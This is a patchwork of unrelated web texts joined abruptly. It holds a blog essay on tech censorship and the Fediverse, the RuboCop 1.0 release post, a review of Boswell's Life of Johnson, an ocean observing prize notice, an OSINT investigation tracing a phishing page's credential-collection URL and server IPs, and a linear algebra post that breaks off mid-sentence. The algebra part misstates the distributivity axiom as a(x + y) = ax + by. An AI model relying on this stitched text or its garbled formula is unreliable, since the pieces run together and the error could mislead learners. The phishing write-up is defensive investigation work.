<p>The Internet of the 90s was a place of wonder. I started my journey on the Internet using a dial-up modem on a Windows 3.1 PC with Trumpet WinSock. Netscape Navigator was a far cry from the ANSI art and RIP graphics of bulletin boards. I started creating and editing websites with Netscape Composer, before eventually writing my own HTML. Some of my <a href="https://battlepenguin.com/tech/a-history-of-personal-and-professional-websites/#high-school-the-web-in-the-late-90s">very first websites</a> were run from a computer under a desk in my cousin’s cubicle. Meanwhile, many of my friends were experiencing the early Internet through American On-Line. With its keywords, chat rooms and instant messaging, its built in web browser felt like more of an afterthought. Even though AOL eventually implemented their own WinSock layer, allowing traditional Internet applications and browsers, AOL would lose relevance under a mountain of free trial CDs, as people moved on to local dial-up and broadband Internet service providers (ISPs).</p>

<p>Every broadcast format started with a free flow of information. At one time, newspapers were run cheaply and independently, spreading information via travelers from town to town. Radio was an open medium as well, with people independently hosting all kinds of news, music and religious programming, before the FCC began splitting up and regulating frequencies<sup id="fnref:1"><a href="#fn:1">5</a></sup>. The Internet shouldn’t suffer from the same limitations as radio or TV broadcasts. Where those frequencies were limited and needed to be sliced up, the Internet allows direct point-to-point communication between individuals and servers, with vastly scalable bandwidth capacities. Members of the tech community have long pushed for Network Neutrality legislation, with fears that major network backbone providers would limit the quality of service for independent websites.</p>

<p>However, there is another major factor in controlling the flow of information the Internet: the growth and prominence of Internet megasites. Although I recently <a href="https://battlepenguin.com/tech/moving-from-youtube-to-peertube/">copied all my videos to my private PeerTube server</a>, independent video sites do not have the scale and discoverability of YouTube. Although I only use Facebook and Twitter to promote material I host outside of those websites, by not interacting with people via those platforms, my content doesn’t have the same reach due to the black box of social media algorithms and the <a href="https://battlepenguin.com/tech/facebook-and-the-silent-bob-effect/">silent bob effect</a>.</p>

<h3 id="censorship">Censorship</h3>

<p>In the United States, our Bill of Rights protects the <a href="https://battlepenguin.com/politics/why-i-no-longer-hate-america/#the-freedom-to-speak">speech of individuals against censorship from the government</a>. However, private companies are allowed to exercise control over their own platforms. When it comes to Facebook, Twitter, YouTube and even Reddit, their reach is absolutely massive. When the New York Post broke its article about Hunter Biden, Facebook said it was “reducing its distribution” on their platform<sup id="fnref:6"><a href="#fn:6">6</a></sup>. Twitter blocked the New York Post from accessing their own accounts, along with several others who reposted the article. Twitter also blocked direct messaging of the article, and even listed the Republican Judiciary Committee’s official website as being <em>unsafe</em> when the House posted their own response to the Biden investigation.</p>

<p>In July, Reddit banned over 2,000 communities<sup id="fnref:15"><a href="#fn:15">7</a></sup>. Discord has started shutting down communities for misinformation<sup id="fnref:16"><a href="#fn:16">8</a></sup>. On October 15th, YouTube purged dozens of channels<sup id="fnref:7"><a href="#fn:7">9</a></sup>. Many of these channels had over 100,000 subscribers, and the total count for all the subscriptions lost was over 7 million<sup id="fnref:8"><a href="#fn:8">10</a></sup>. Even though these voices have not been censored by a government entity, <a href="https://battlepenguin.com/politics/the-new-era-of-corporate-censorship/">corporate censorship</a> is still censorship. Furthermore, we are now seeing corporations limiting access to information provided by the government, pushing narratives that further their agenda, and overtly influencing, if not downright interfering, in the <a href="https://battlepenguin.com/politics/video/does-voting-make-a-difference/">American election process</a>.</p>

<blockquote>
  <p><em>“Where we’re seeing [arrogance] now, where it is the most frightening of all is the god damn tech sector. Right? These people actually think that they know what is true, with sufficient clarity, that they’re going to go about labeling beliefs as false … for example … We highlighted two heterodox papers about COVID on our last live stream. Now one of them I must say I have some trepidations about; the Yan paper. But the Yan paper makes arguments that one can evaluate. Now some of those arguments, I think, raise questions … and in fact, I’ve gotten some correspondence from people who spotted various things that seem wrong … Nonetheless, the tech sector has decided, ‘Well this is dangerous information’ and they have suspended her [Twitter] account…and they’re forbidding the posting of the paper or labeling it misinformation…“</em> -Bret Weinstein, DarkHorse Podcast<sup id="fnref:12"><a href="#fn:12">11</a></sup></p>
</blockquote>

<p>The hubris of the tech sector is especially troubling when it comes to deciding what facts are true or scientific. In July, Dr. Li-Meng Yan, a doctor who specialized in virology and immunology at the Hong Kong School of Public Health, accused the Chinese government of covering up information about COVID19 including early reports of human-to-human transmission<sup id="fnref:13"><a href="#fn:13">12</a></sup>. In September, Twitter suspended Yan’s account, in response to her claims of a lab origin for the SARS-CoV2 virus<sup id="fnref:14"><a href="#fn:14">13</a></sup>. Such claims can be open to discussion and examination, but the big technology companies show their arrogance by proclaiming their knowledge as the <em>truth</em>. This has led to <a href="https://battlepenguin.com/politics/this-is-not-a-time-of-honor/#censorship">censorship of any dissenting viewpoints, even by other medical professionals</a>.</p>

<p>In George Orwell’s novel <em>1984</em>, the <em>Ministry of Truth</em> was a government organization that edited the past to fit the current state of the major political party. In today’s world, the <em>Ministry of Truth</em> is analogous to the technology sector. The fact checks they place on posts and content are pure arrogance. They are essentially telling the world, “You are too stupid to do your own analysis, so we will tell you what to think.”</p>

<h3 id="technology-as-a-solution">Technology as a Solution</h3>

<blockquote>
  <p><em>“The Net interprets censorship as damage and routes around it.”</em> -John Gilmore<sup id="fnref:9"><a href="#fn:9">14</a></sup></p>
</blockquote>

<p>There are many centralized alternatives to the big platforms. Facebook has bought several of them including WhatsApp and Instagram. There are also several decentralized platforms that are independently run, yet can communicate with one another. I currently run <a href="https://battlepenguin.video/">my own PeerTube</a> server, a <a href="https://hitchhiker.social/@djsumdog">Mastodon Instance</a> and a <a href="https://djsumdog.com/@djsumdog">Pleroma+SoapBox server</a>. These are platforms running open source software, which I host on servers I pay for. They can communicate with each other using a protocol called ActivityPub, which can be thought of as an e-mail (SMTP) protocol, but for social networking. They obviously do not have the reach of the big players, but they are capable alternatives which use the technology of the Internet to route around the censorship of big tech.</p>

<figure>
  
  <img src="https://battlepenguin.com/images/tech/sol-to-fb-twitter/fedi-expectation-reality.png" alt="Fediverse Logo with Connected Graph (Expected) next to Fediverse Logo with Broken Graph (Reality)">
  
  
</figure>

<p>Obviously, these platforms have issues as well. People who run servers often block certain lists of servers they may not agree with. There is censorship and there are echo chambers within this system of federated social networking servers (colloquially known to many as The Fediverse). However, if you are unhappy with the way a particular server’s administrator is moderating posts or choosing what servers to communicate with, you can create an account on another server instead. If you have the technical background or are willing to learn, you can set up your own server. Unlike Reddit or Discord, one organization doesn’t control every single community. Each community is individually funded and hosted, making them difficult to censor.</p>

<h3 id="put-in-the-effort">Put in the Effort</h3>

<p>I’ve given a few friends invitations to my servers. I try not to be a Fediverse evangelist, as trying to get people to embrace it had similar results to promoting Linux as a desktop operating system back in the 90s and early 2000s. Many people who join a Mastodon server may be overwhelmed by the Federated Timeline. Fenollosa, an engineer out of Barcelona, recommends that people look at the local time lines of different servers, finding one that fits their interests and tastes<sup id="fnref:10"><a href="#fn:10">15</a></sup>.</p>

<p>Still, many people are persuaded to join other centralized platforms after their accounts, or communities they follow, are banned. This creates a diaspora of Internet users from some platforms, often with specific politics or directed anger. This can lead to alternative centralized platforms such as Voat, which become <a href="https://battlepenguin.com/tech/voat-what-went-wrong/">one-sided and polarized</a>. Gab was such a platform, and after getting banned from both the Google and Apple app stores<sup id="fnref:11"><a href="#fn:11">16</a></sup>, attempted a short run of joining the Fediverse. Their platform was met with heavy resistance, blocked from most servers and Fediverse apps and, for better or worse, eventually defederated themselves.</p>

    <blockquote>
  <p>If at first you don’t succeed, call it version 1.0.</p>
</blockquote>

<p>RuboCop’s development started exactly 7 and half years ago. I made
<a href="https://github.com/rubocop-hq/rubocop/commit/afbead34db54506c12a21dbd4ce04fada0f8b9a4#diff-bc37d034bad564583790a46f19d807abfe519c5671395fd494d8cce506c42947">the first
commit</a>
on April 21, 2012. That’s a lot of time in general, but even more in
the fast moving world of IT. During this long period we’ve racked up some
impressive numbers:</p>

<ul>
  <li><strong>9905</strong> commits</li>
  <li><strong>152</strong> releases</li>
  <li>around <strong>3500</strong> closed issues</li>
  <li>almost <strong>5000</strong> merged pull requests</li>
  <li>over <strong>120 million</strong> downloads</li>
  <li>over <strong>200</strong> publicly available related gems (extensions, custom configurations, etc)</li>
  <li>over <strong>700</strong> contributors</li>
</ul>

<p>I never expected any of this on April 21, 2012. If there’s a person truly
surprised by the success of RuboCop that’d be me. But wait, there’s more!
We also reached some important milestones in the last couple of years:</p>

<ul>
  <li>Created the <a href="https://github.com/rubocop-hq">RuboCop HQ organization</a> that became the home for RuboCop, the community style guides, and many popular RuboCop extensions</li>
  <li>Extracted the Rails cops to a separate gem (<code>rubocop-rails</code>)</li>
  <li>Extracted the performance cops to a separate gem (<code>rubocop-performance</code>)</li>
  <li>Extracted the AST-related functionality to a separate gem (<code>rubocop-ast</code>)</li>
  <li>Created new extensions focused on Rake (<code>rubocop-rake</code>) and Minitest (<code>rubocop-minitest</code>)</li>
  <li>Made significant improvements to RuboCop’s code formatting capabilities</li>
  <li>Reworked the cop API</li>
  <li>Switched to safe-only cops by default</li>
  <li>Introduced the notion of “pending” cops</li>
  <li>Created a brand new <a href="https://docs.rubocop.org/">documentation site</a></li>
  <li>Provided more polished versions of the community style guides over at <a href="https://rubystyle.guide/">https://rubystyle.guide</a></li>
</ul>

<p>One thing eluded us, though - a “stable” RuboCop release. Today this finally changes with
RuboCop 1.0!<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>There’s nothing ground-breaking about the new RuboCop release - it’s almost the same as RuboCop 0.93.1 that
preceded it. I believe the only change, that most of you are going to notice, is that all cops that used to be
“pending” are now enabled by default, which is in line with our release policy. No new cops will be enabled
by default until RuboCop 2.0.</p>

<p>The big news for end users and maintainers of extensions is that we’re finally embracing fully Semantic Versioning, which
should make the upgrade process simpler (painless?) for everyone. Going forward the following things will happen only on major releases:</p>

<ul>
  <li>enabling of new cops</li>
  <li>changes to the default cop configuration</li>
  <li>breaking API changes</li>
</ul>

<p>It’s really funny that I felt for at least a couple of years that we were very close to the 1.0
release, only to come up with more and more things I wanted to include in it. I believe <a href="https://rubykaigi.org/2018/presentations/bbatsov.html">I first spoke</a>
about my intentions to ship RuboCop 1.0 at RubyKaigi 2018 and back then I truly believed this was bound to happen in the next
6 months. Classic example of planning in the software development world, right?</p>

<p>Many people urged me for years to label a random release as 1.0 with
the argument that if some software is useful and widely used than it
probably deserves that magic moniker. It’s not a bad argument and I
totally understood the perspective of those people. I, however, was
not convinced as for me version 1.0 also stands for “we got to a place
we consider feature complete and aligned with our vision”.  Needless
to say - the vision we (RuboCop’s team) had was quite ambitious and it took us
a while to make it a reality.</p>

<p>I cannot begin to explain how happy I am that we got here, and I can
assure you that it wasn’t easy.  Over the years RuboCop had its ups
and downs, it got a lot of praise, but also a lot of flak.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Some
days I was super pumped and motivated to work on it, on other days I
couldn’t stand to think about it.  Working on popular OSS projects is
one of the most rewarding and most frustrating experiences that one
can have.  I was (un)fortunate enough to be involved in a few of those
(RuboCop, CIDER, nREPL, Projectile, Emacs Prelude, etc) and each one
was a crazy roller-coaster ride.</p>

<p>I find it funny how my role in RuboCop evolved with time. Originally I
used to write mostly code, these days I write mostly tickets,
issue/code review comments and documentation. Often I feel more like a
project manager rather than a programmer. There was a time when I was
super happy to see a PR and I’d immediately respond to it, now I can’t
keep up with all the PRs. In fact, our entire team can’t keep up with
them, so consider this my apology that it sometimes takes a while to
get feedback on your suggestions. I’ll even admit that I rarely read
issue tickets these days as there are so many of them and it’s
impossible for me to respond to all of them. I’ve just learned that
important tickets always get noticed, if not by me than by someone else from our
fantastic team.</p>

<p>I want to extend special thanks to RuboCop’s core team, as we would have never gotten so far without all those amazing people
working tirelessly on the project:</p>

<ul>
  <li><a href="https://github.com/jonas054">Jonas Arvidsson</a></li>
  <li><a href="https://github.com/yujinakayama">Yuji Nakayama</a> (retired)</li>
  <li><a href="https://github.com/edzhelyov">Evgeni Dzhelyov</a> (retired)</li>
  <li><a href="https://github.com/drenmi">Ted Johansson</a></li>
  <li><a href="https://github.com/pocke">Masataka Kuwabara</a></li>
  <li><a href="https://github.com/koic">Koichi Ito</a></li>
  <li><a href="https://github.com/darhazer">Maxim Krizhanovski</a></li>
  <li><a href="https://github.com/bquorning">Benjamin Quorning</a></li>
  <li><a href="https://github.com/marcandre">Marc-André Lafortune</a></li>
</ul>

<p>You rock, guys!</p>

<p>Jonas, in particular, deserves just as much credit for RuboCop existing today as me. He was the first contributor to RuboCop and he
pushed me to get RuboCop to the state where it got critical mass, mindshare and some traction. It’s a long story for another day and another article.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></p>

<p>Koichi also deserves a special mention for his tireless work and incredible dedication to RuboCop and its users over the years! And for his great karaoke skills!
He has also been a fantastic head maintainer for key RuboCop extensions like <code>rubocop-rails</code>, <code>rubocop-performance</code> and <code>rubocop-minitest</code>.</p>

<p>Last, but not least - another round of big thanks for all the people who contributed to RuboCop in any capacity over the years! RuboCop is all of you!
Keep those contributions coming!</p>

<p>Some closing notes:</p>

<ul>
  <li>As mentioned above, recently we’ve extracted RuboCop’s AST-related logic to the <a href="https://github.com/rubocop-hq/rubocop-ast">rubocop-ast</a> gem, that’s going to be very handy for everything looking to supercharge
<a href="https://github.com/whitequark/parser">parser</a>’s API. I’d love to see more tools using it, as I think we really managed to simplify the interaction with an AST. Work on the new gem is led by the awesome Marc-André Lafortune. By the way, he released <code>rubocop-ast</code> 1.0 today! We have some cause for double celebration!</li>
  <li>The cop API was completely reworked recently by Marc-André. He did some truly fantastic work there! Check out the <a href="https://docs.rubocop.org/rubocop/v1_upgrade_notes.html">upgrade notes</a> if you maintain any RuboCop extensions, as the legacy API will be removed
in RuboCop 2.0.</li>
  <li>We’ve made some changes to how department names are calculated that might affect some extensions. Read more about them <a href="https://github.com/rubocop-hq/rubocop/pull/8490">here</a>.</li>
  <li>Check out the <a href="https://github.com/rubocop-hq/rubocop/releases/tag/v1.0.0">release notes</a> for all the details.</li>
  <li><code>rubocop-rspec</code> is currently not compatible with RuboCop 1.0, but we’re working on this. You can follow the progress on that front <a href="https://github.com/rubocop-hq/rubocop-rspec/issues/1051">here</a>.</li>
</ul>

<p>And that’s a wrap!</p>

<p>I feel a bit sorry for disappointing everyone who hoped we’d make it
to RuboCop 0.99, before cutting RuboCop 1.0. We did our best and we
had a great 0.x run, but we ran out of things to do.<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup> :-) On the bright side - now
I can finally say that I’ve got 99 problems (and 200 open issues), but cutting RuboCop 1.0 ain’t one.</p>

<p>Enjoy RuboCop 1.0 and share with us your feedback about it! Our focus now shifts to RuboCop 1.1, and I hope that we’ll be dropping
new major releases rather infrequently going forward (although RuboCop 2.0 will probably arrive in less than 7 years). Thanks for your help, love, feedback and
support! Keep hacking!</p>

<p><strong>P.S.</strong> Koichi recently covered in great details our long journey to RuboCop 1.0 in his presentation <a href="https://speakerdeck.com/koic/road-to-rubocop-1-dot-0">Road to RuboCop 1.0</a> at RubyKaigi 2020. I cannot recommend it highly enough to those of you who’d like to learn more about the technical aspects of RuboCop 1.0 and all the challenges we had to solve along the way!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Boswell's <em>Life of Johnson</em> is not just one of my favorite books, it also engendered some of my favorite book reviews. While praise for the work is universal, the main question commentators try to answer is this: how did the worst man in the world manage to write the best biography?</p><p>Who was James Boswell? He was a perpetual drunk, a degenerate gambler, a sex addict, whoremonger, exhibitionist, and rapist. He gave his wife an STD he caught from a prostitute.</p><p>Selfish, servile and self-indulgent, lazy and lecherous, vain, proud, obsessed with his aristocratic status, yet with no sense of propriety whatsoever, he frequently fantasized about the feudal affection of serfs for their lords. He loved to watch executions and was a proud supporter of slavery.</p><p>“Where ordinary bad taste leaves off,” John Wain comments, “Boswell began.” The Thrales were long-time friends and patrons of Johnson; a <em>single day</em> after Henry Thrale died, Boswell wrote a poem fantasizing about the elderly Johnson and the just-widowed Hester: "Convuls'd in love's tumultuous throws, / We feel the aphrodisian spasm". The rest of his verse is of a similar quality; naturally he considered himself a great poet.</p><p>Boswell combined his terrible behavior with a complete lack of shame, faithfully reporting every transgression, every moronic ejaculation, every faux pas. The first time he visited London he went to see a play and, as he happily tells us himself, he "entertained the audience prodigiously by imitating the lowing of a cow."</p><p>By all accounts, including his own, he was an idiot. On a tour of Europe, his tutor said to him: "of young men who have studied I have never found one who had so few ideas as you."</p><p>As a lawyer he was a perpetual failure, especially when he couldn't get Johnson to write his arguments for him. As a politician he didn't even get the chance to be a failure despite decades of trying.</p><p>His correspondence with Johnson mostly consists of Boswell whining pathetically and Johnson telling him to get his shit together.</p><p>He commissioned a portrait from his friend Joshua Reynolds and stiffed him on the payment. His descendants hid the portrait in the attic because they were ashamed of being related to him.</p><p>Desperate for fame, he kept trying to attach himself to important people, mostly through sycophancy. In Geneva he pestered Rousseau,<span><a href="#fn2189487741" rel="footnote"><sup id="fnref2189487741">1</sup></a></span> leading to this conversation:</p><blockquote><p>Rousseau: You are irksome to me. It’s my nature. I cannot help it.<br>Boswell: Do not stand on ceremony with me.<br>Rousseau: Go away.</p></blockquote><p>Later, Boswell was given the task of escorting Rousseau's mistress Thérèse Le Vasseur to England—they had an affair on the way.</p><p>When Adam Smith and Edward Gibbon were elected to The Literary Club, Boswell considered leaving because he thought the club had now "lost its select merit"!</p><p>On the positive side, his humor and whimsy made for good conversation; he put people at ease; he gave his children all the love his own father had denied him; and, somehow, he wrote one of the great works of English literature.</p><p><em>The Life of Samuel Johnson, LL.D.</em> was an instant sensation. While the works of Johnson were quickly forgotten,<span><a href="#fn2189487742" rel="footnote"><sup id="fnref2189487742">2</sup></a></span> his biography has never been out of print in the 229 years since its initial publication. It went through 41 editions just in the 19th century.</p><p>Burke told King George III that he had never read anything more entertaining. Coleridge said "it is impossible not to be amused with such a book." George Bernard Shaw compared Boswell's dramatization of Johnson to Plato's dramatization of Socrates, and placed old Bozzy in the middle of an "apostolic succession of dramatists" from the Greek tragedians through Shakespeare and ending, of course, with Shaw himself.</p><p>It is a strange work, an experimental collage of different modes: part traditional biography, part collection of letters, and part direct reports of Johnson's life as observed by Boswell.<span><a href="#fn2189487743" rel="footnote"><sup id="fnref2189487743">3</sup></a></span> His inspiration came not from literature, but from the minute naturalistic detail of Flemish paintings. It is difficult to convey its greatness in compressed form: Boswell is not a great writer at the sentence level, and all the famous quotes are Johnsonian <em>bon mots</em>. The book succeeds through a cumulative effect.</p><p>Johnson was 54 years old when he first met Boswell, and most of his major accomplishments (the poetry, the dictionary, <em>The Rambler</em>) were behind him; his wife had already died; he was already the recipient of a £300 pension from the King; his edition of Shakespeare was almost complete. All in all they spent no more than 400 days together. Boswell had limited material to work with, but what he doesn't capture in fact, he captures in feeling: an entire life is contained in this book: love and friendship, taverns and work, the glory of success and recognition, the depressive bouts of failure and penury, the inevitable tortures of aging and death.</p><p>Out of a person, Boswell created a literary personality. His powers of characterization are positively Shakespearean, and his Johnson resembles none other but the bard's greatest creation: Sir John Falstaff. Big, brash, and deeply flawed, but also lovable. He would "laugh like a rhinoceros":</p><blockquote><p>Johnson could not stop his merriment, but continued it all the way till he got without the Temple-gate. He then burst into such a fit of laughter that he appeared to be almost in a convulsion; and in order to support himself, laid hold of one of the posts at the side of the foot pavement, and sent forth peals so loud, that in the silence of the night his voice seemed to resound from Temple-bar to Fleet ditch.</p></blockquote><p>And around Johnson he painted an entire dramatic cast, bringing 18th century London to life: Garrick the great actor, Reynolds the painter, Beauclerk with his banter, Goldsmith with his insecurities. Monboddo and Burke, Henry and Hester Thrale, the blind Mrs Williams and the Jamaican freedman Francis Barber.</p><p>Borges (who was also a big fan) finds his parallels not in Shakespeare and Falstaff, but in Cervantes and Don Quixote. He (rather implausibly) suggests that every Quixote needs his Sancho, and "Boswell appears as a despicable character" deliberately to create a contrast.<span><a href="#fn2189487744" rel="footnote"><sup id="fnref2189487744">4</sup></a></span></p><p>And in the 1830s, two brilliant and influential reviews were written by two polar opposites: arch-progressive Thomas Babington Macaulay and radical reactionary Thomas Carlyle. The first thing you'll notice is their sheer magnitude: <a href="https://oll-resources.s3.amazonaws.com/titles/362/1227.01_Bk.pdf" target="_blank" rel="noopener">Macaulay's</a> is 55 pages long, while <a href="https://sci-hub.se/https://doi.org/10.1017/CBO9780511697234.003" target="_blank" rel="noopener">Carlyle's review in Fraser's Magazine</a> reaches 74 pages!<span><a href="#fn2189487745" rel="footnote"><sup id="fnref2189487745">5</sup></a></span> And while they both agree that it's a great book and that Boswell was a scoundrel, they have very different theories about what happened.</p><h2 id="Macaulay"><a href="#Macaulay" title="Macaulay"></a>Macaulay</h2><p>Never in history, Macaulay says, has there been "so strange a phænomenon as this book". On the one hand he has effusive praise:</p><blockquote><p>Homer is not more decidedly the first of heroic poets, Shakspeare is not more decidedly the first of dramatists, Demosthenes is not more decidedly the first of orators, than Boswell is the first of biographers. He has no second. He has distanced all his competitors so decidedly that it is not worth while to place them.</p></blockquote><p>On the other hand, he spends several paragraphs laying into Boswell with gusto:</p><blockquote><p>He was, if we are to give any credit to his own account or to the united testimony of all who knew him, a man of the meanest and feeblest intellect. [...] He was the laughing-stock of the whole of that brilliant society which has owed to him the greater part of its fame. He was always laying himself at the feet of some eminent man, and begging to be spit upon and trampled upon. [...] Servile and impertinent, shallow and pedantic, a bigot and a sot, bloated with family pride, and eternally blustering about the dignity of a born gentleman, yet stooping to be a talebearer, an eavesdropper, a common butt in the taverns of London.</p></blockquote><p>Macaulay's theory is that while Homer and Shakespeare and all the other greats owe their eminence to their virtues, Boswell is unique in that he owes <em>his</em> success to his vices.</p><blockquote><p>He was a slave, proud of his servitude, a Paul Pry, convinced that his own curiosity and garrulity were virtues, an unsafe companion who never scrupled to repay the most liberal hospitality by the basest violation of confidence, a man without delicacy, without shame, without sense enough to know when he was hurting the feelings of others or when he was exposing himself to derision; and because he was all this, he has, in an important department of literature, immeasurably surpassed such writers as Tacitus, Clarendon, Alfieri, and his own idol Johnson.</p></blockquote><blockquote><p>Of the talents which ordinarily raise men to eminence as writers, Boswell had absolutely none. There is not in all his books a single remark of his own on literature, politics, religion, or society, which is not either commonplace or absurd. [...] Logic, eloquence, wit, taste, all those things which are generally considered as making a book valuable, were utterly wanting to him. He had, indeed, a quick observation and a retentive memory. These qualities, if he had been a man of sense and virtue, would scarcely of themselves have sufficed to make him conspicuous; but, because he was a dunce, a parasite, and a coxcomb, they have made him immortal.</p></blockquote><p>The work succeeds partly because of its subject: if Johnson had not been so extraordinary, then airing all his dirty laundry would have just made him look bad.</p><blockquote><p>No man, surely, ever published such stories respecting persons whom he professed to love and revere. He would infallibly have made his hero as contemptible as he has made himself, had not his hero really possessed some moral and intellectual qualities of a very high order. The best proof that Johnson was really an extraordinary man is that his character, instead of being degraded, has, on the whole, been decidedly raised by a work in which all his vices and weaknesses are exposed.</p></blockquote><p>And finally, Boswell provided Johnson with a curious form of literary fame:</p><blockquote><p>The reputation of [Johnson's] writings, which he probably expected to be immortal, is every day fading; while those peculiarities of manner and that careless …</p></blockquote></div></div>

                  This joint prize between the Water Power Technologies Office (WPTO) at the U.S. Department of Energy and the Integrated Ocean Observing System (IOOS®) Office at the National Oceanic and Atmospheric Administration (NOAA) seeks to develop new technologies that can help fill the data gaps making it difficult to realize the full potential of the Blue Economy. The Ocean Observing Prize includes a series of competitions with millions of dollars in awards to encourage rapid innovation in the fields of marine energy and ocean observations, that began with the DISCOVER Competition and is followed by the DEVELOP Competition. The Pacific Northwest National Laboratory and the National Renewable Energy Laboratory are supporting DOE and NOAA on the development and administration of the prize.

                The Ocean Observing Prize is a series of competitions with cash awards to incentivize accelerated advancement of ideas from concept to demonstration. The first competition, the DISCOVER Competition, closed on February 12, 2020. Competitors submitted novel concepts that integrate ocean observing technologies with marine energy systems to address end-user needs across five broad themes: (1) Unmanned Vehicles; (2) Communications and Underwater Navigation; (3) Extreme Environments; (4) Buoys, Floats, and Tags; and (5) Blue Sea Ideas (i.e. other). Following the DISCOVER Competition, the DEVELOP Competition focuses on a single theme, <a href="https://americanmadechallenges.org/oceanobserving/develop.html">hurricane monitoring</a>, and challenges contestants to develop their ideas into a functioning prototype through three contests: DESIGN, BUILD, and SPLASH. Together, the DISCOVER and DEVELOP Competitions will award up to $3 million in cash prizes as well as other in-kind awards.
              </p>
              <p>
                The Ocean Observing Prize is repeatable, and it is expected that future iterations may focus on other themes. Through this competition, innovators will be able to tap into DOE and NOAA’s network of National Laboratories, energy incubators and accelerators, subject matter experts, and other resources across the nation to build novel technologies that collect critical ocean data.

<p>Today’s OSINT investigation involves a talented young hacker, who slowly turned into the operator of a large-scale phishing network. What we found on the surface is a story of a happy father, who facilitates identity theft when nobody is looking. In this article, we demonstrate how we managed to track down the operator of this phishing operation called ‘Bulletproftlink’.</p>

<p>As usual, it all started with a phishing email impersonating a Sydney-based accounting firm. The email came from an accountant and it looked reasonable legitimate. There was <a rel="nofollow noopener noreferrer" target="_blank" href="https://blog.ironbastion.com.au/why-outdated-anti-phishing-advice-leaves-you-exposed-part-1/">no sign of broken English or a spoofed email sender</a>, the message looked rather convincing.</p>

</div>
<p>The <code>Remittance Advice receipts.pdf</code> link took me to a downloadable HTML file hosted on Dropbox. Once we did go down the rabbit hole, the link redirections ultimately led us to a fake login page served from the Google Cloud Storage platform.</p>
<p>It was a password-stealing page, a pixel-perfect clone of the Microsoft login page. If a victim enters their password on this page, the login credentials are sent straight to the criminals rather than Microsoft. These passwords are usually end up on the black market for those being in the business of identity theft.</p>

<h2 id="where-did-the-passwords-go">Where did the passwords go?</h2>
<p>The following step was the dissection of the fake login page to see where the victims’ password is transmitted.</p>
<p>Although the phishing page was featuring some level of code obfuscation, we did not have to fire up the Burp Suite this time. This time, the code inspector was enough to reveal that the destination of the stolen passwords was <code>https://moneysmtp.com/email-list/office365nw/finish.php</code>.</p>

<p>The next stage was poking around on this page capturing the passwords.</p>
<p>When we punched the URL into a web browser, the remote end responded with a simple <code>OK</code> message. Unfortunately, the HTTP headers did not reveal that much either. The root page at <code>https://moneysmtp.com/</code> did not show too much either apart from a reference to Vesta Control Panel, a popular application within server hosting circles.</p>

<p>To make it worse, the remote end was hidden behind Cloudflare, so the IP address remained hidden for the time being.</p>

<h3 id="other-brands-impersonated">Other brands impersonated</h3>
<p>The first find was that <code>moneysmtp.com</code> was linked to phishing campaigns impersonating other brands and services such as <strong>OneDrive</strong>, <strong>Outlook Web Access</strong>, <strong>Jetstar</strong> and <strong>Wells Fargo</strong> according to urlscan.io. In other words, passwords are unwittingly given away on these phishing pages also end up on <code>moneysmtp.com</code>.</p>

<h2 id="finding-the-origin-server">Finding the origin server</h2>
<p>The breakthrough came when we ran an <strong>IPv4 Hosts</strong> search for the domain name on Censys. The search query returned two IP addresses associated with ‘moneysmtp.com’: <code>62.149.20.89</code> and <code>62.149.20.90</code>.</p>

<p>First, we thought this was a good lead, as the two IP addresses seem to belong to <code>7Heaven LLC (7h.com.ua)</code>, a no-questions-asked server hosting provider in Ukraine. Little did we know, this was a dead-end, and the traces were leading to Asia instead.</p>
<h2 id="getting-closer-to-the-operator">Getting closer to the operator</h2>
<p>Following a brief look into 7Heaven LLC that led nowhere, we went back to Censys to run a different query.</p>
<p>This time, however, we searched within the <strong>Certificates</strong> category, and voilà, there was an email address associated with our adversary: <code><a href="https://osint.fans/cdn-cgi/l/email-protection" data-cfemail="fc8894999b8e9999929185c4cbbc9b919d9590d29f9391">[email&nbsp;protected]</a></code>.</p>

<p>That’s a warm lead!

In cybersecurity terms, we managed to climb the <a rel="nofollow noopener noreferrer" target="_blank" href="https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html">Pyramid of Pain</a> rather high allowing network operators stop this phishing campaign from stealing credentials on their networks (as long as the adversary does not change their tactics).</p>

<p>By <b>Susam Pal</b> on 30 Jan 2019</p>
<h2 id="vector-spaces"><a href="#vector-spaces">Vector Spaces</a></h2>
<p>
A fascinating result that appears in linear algebra is the fact that the
set of real numbers \( \mathbb{R} \) is a vector space over the set of
rational numbers \( \mathbb{Q}. \) This may appear surprising at first
but it is easy to show that it is indeed so by checking that all eight
axioms of vector spaces hold good:
</p>

<ol>
  <li>
    <p>
      Commutativity of vector addition:<br>
      \( x + y = y + x \) for all \( x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Associativity of vector addition:<br>
      \( x + (y + z) = (x + y) + z \) for all \( x, y, z \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive identity vector:<br>
      We have \( 0 \in \mathbb{R} \) such that \( x + 0 = x \) for all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of additive inverse vectors:<br>
      There exists \( -x \in \mathbb{R} \) for all \( x \in \mathbb{R}.
      \)
    </p>
  </li>
  <li>
    <p>
      Associativity of scalar multiplication:<br>
      \( a(bx) = (ab)x \) for all \( a, b \in \mathbb{Q} \) and all \( x
      \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over vector addition:<br>
      \( a(x + y) = ax + by \) for all \( a \in \mathbb{Q} \) and all \(
      x, y \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Distributivity of scalar multiplication over scalar addition:<br>
      \( (a + b)x = ax + bx \) for all \( a, b \in \mathbb{Q} \) and all
      \( x \in \mathbb{R}. \)
    </p>
  </li>
  <li>
    <p>
      Existence of scalar multiplicative identity:<br>
      We have \( 1 \in \mathbb{Q} \) such that \( 1 \cdot x = x \) for
      all \( x \in \mathbb{R}. \)
    </p>
  </li>
</ol>
<p>
  This shows that the set of real numbers \( \mathbb{R} \) forms a
  vector space over the field of rational numbers \( \mathbb{Q}. \)
  Another quick way to arrive at this fact is to observe that \(
  \mathbb{Q} \subseteq \mathbb{R}, \) that is, \( \mathbb{Q} \) is a
  subfield of \( \mathbb{R}. \) Any field is a vector space over any of
